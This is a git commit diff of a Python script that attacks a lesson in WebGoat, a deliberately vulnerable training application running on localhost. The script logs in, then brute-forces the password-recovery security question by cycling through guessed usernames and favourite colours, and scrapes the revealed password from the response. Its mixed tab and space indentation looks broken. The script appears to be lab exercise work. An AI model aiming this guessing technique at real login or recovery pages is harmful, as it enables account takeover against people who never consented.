44cc82a3fc2f47208d4f2792600d94a40a1a18ad
root <root@localhost.localdomain>
2015-12-08 23:57:06 +0100

    f

--- examples/webgoat/vuln-38/tjh_attack.py
+++ examples/webgoat/vuln-38/tjh_attack.py
@@ -2,6 +2,7 @@ import requests
 import json
 
 url = "http://127.0.0.1:8080/WebGoat"
+valSpace = 18  #distance between value and acutal password
 url1 = url + "/start.mvc"
 lessonURL = url + "/service/lessonmenu.mvc"
 
@@ -13,7 +14,7 @@ s = requests.Session()
 s.get(url)
 s.post(url + "/j_spring_security_check;jsessionid=" + s.cookies.get('JSESSIONID'),data=payload, headers = headers)
 r = s.get(url1)
-print r.content
+#print r.content
 r1 = s.get(lessonURL) #contains screen# and menu# for attack URL
 
 parsed_json = json.loads(r1.content)
@@ -21,11 +22,27 @@ parsed_json = json.loads(r1.content)
 attackURL = url  + "/"  + parsed_json[4]['children'][1]['link']
 
 
-print "\n\n" + attackURL + "\n\n"
+#print "\n\n" + attackURL + "\n\n"
 
-r2 = s.get(attackURL)
-some = {"Username": "admin"}
-r2 = s.post(attackURL, data=some)
-
-print r2.text
-print "Halelluah!!!"
+usernames = ("bob", "ted", "dylan", "rob", "jeff", "admin")
+a_user = "admin"
+colors = ("orange", "yellow", "red", "blue", "black", "purple", "green")
+a_color = "green"
+got_it = False
+for u in usernames:
+	fun = {"Username": u}
+       	r2 = s.post(attackURL,data=fun)
+	# make the request here for the username
+        if "name='Color'"  in r2.text: # test if request is good here
+        	for c in colors:        
+	        	happy = {"Color": c}
+		        r2 = s.post(attackURL,data=happy) 
+			# make the request here for the color
+                        if "For security reasons" in r2.text: # test if request is good here
+                                got_it = True
+				value = int(r2.text.index("<tr><td>Password: "))
+				value = value + valSpace
+				endVal = int(r2.text.index("</td></tr></table>"))
+				print "username=" + u, ", color=" + c, ", password=" + r2.text[value:endVal] 
+if not got_it:
+        print "none found"
